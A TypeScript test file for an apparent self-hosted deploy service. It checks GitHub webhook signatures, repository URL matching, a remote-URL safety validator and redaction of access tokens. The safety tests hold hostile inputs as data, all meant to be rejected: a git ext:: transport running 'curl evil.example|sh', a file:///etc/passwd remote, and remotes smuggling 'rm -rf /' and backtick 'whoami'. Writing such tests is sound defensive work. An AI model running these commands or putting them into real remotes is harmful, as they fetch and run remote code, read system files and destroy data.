import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import { createHmac } from 'node:crypto'
import { verifyGithubSignature, normaliseRepo } from '../src/api/webhooks.routes.js'
import { assertSafeRemote, CheckoutError } from '../src/git/checkout.js'

describe('webhook signatures', () => {
  const secret = 'a-sufficiently-long-webhook-secret'
  const sign = (body: string) => 'sha256=' + createHmac('sha256', secret).update(body).digest('hex')

  test('accepts a correctly signed body', () => {
    const body = JSON.stringify({ ref: 'refs/heads/main' })
    assert.ok(verifyGithubSignature(body, secret, sign(body)))
  })

  test('rejects a tampered body', () => {
    const signature = sign('{"ref":"refs/heads/main"}')
    assert.equal(verifyGithubSignature('{"ref":"refs/heads/evil"}', secret, signature), false)
  })

  test('rejects the wrong secret', () => {
    const body = '{"a":1}'
    assert.equal(verifyGithubSignature(body, 'another-long-webhook-secret', sign(body)), false)
  })

  test('a malformed signature header does not throw', () => {
    assert.equal(verifyGithubSignature('{}', secret, 'garbage'), false)
    assert.equal(verifyGithubSignature('{}', secret, ''), false)
  })
})

describe('repository matching', () => {
  test('the same repo written four ways is one repo', () => {
    const forms = [
      'https://github.com/you/homelab.git',
      'https://github.com/you/homelab',
      'git@github.com:you/homelab.git',
      'HTTPS://GitHub.com/You/Homelab/',
    ]
    const normalised = new Set(forms.map(normaliseRepo))
    assert.equal(normalised.size, 1, `got ${[...normalised].join(' | ')}`)
  })

  test('a host-less shorthand is deliberately not the same as a full URL', () => {
    // "you/homelab" on GitHub and on GitLab are different repositories, so
    // this must not collapse. The webhook offers both forms as candidates
    // instead, and whichever the service was configured with matches.
    assert.notEqual(normaliseRepo('you/homelab'), normaliseRepo('https://github.com/you/homelab'))
    assert.equal(normaliseRepo('you/homelab'), 'you/homelab')
  })

  test('different repos stay different', () => {
    assert.notEqual(normaliseRepo('github.com/you/a'), normaliseRepo('github.com/you/b'))
  })
})

describe('remote safety', () => {
  test('allows ordinary https and ssh remotes', () => {
    assert.doesNotThrow(() => assertSafeRemote('https://github.com/you/repo.git'))
    assert.doesNotThrow(() => assertSafeRemote('git@github.com:you/repo.git'))
  })

  test('refuses git transports that execute a command', () => {
    // git will happily run `ext::sh -c ...` as a transport, and the remote
    // comes from user input.
    assert.throws(() => assertSafeRemote('ext::sh -c "curl evil.example|sh"'), CheckoutError)
    assert.throws(() => assertSafeRemote('file:///etc/passwd'), CheckoutError)
  })

  test('refuses shell metacharacters in a remote', () => {
    assert.throws(() => assertSafeRemote('https://github.com/a;rm -rf /'), CheckoutError)
    assert.throws(() => assertSafeRemote('https://github.com/a`whoami`'), CheckoutError)
  })
})

describe('credential redaction', () => {
  test('an installation token never survives into an error or a log', async () => {
    // git echoes the remote in its own error output, token and all, and an
    // installation token is a live credential for an hour.
    const { redactRemote } = await import('../src/git/checkout.js')
    assert.equal(
      redactRemote('https://x-access-token:ghs_LIVE_TOKEN_VALUE@github.com/you/private.git'),
      'https://***@github.com/you/private.git'
    )
    assert.equal(
      redactRemote('https://github.com/you/public.git'),
      'https://github.com/you/public.git'
    )
  })
})
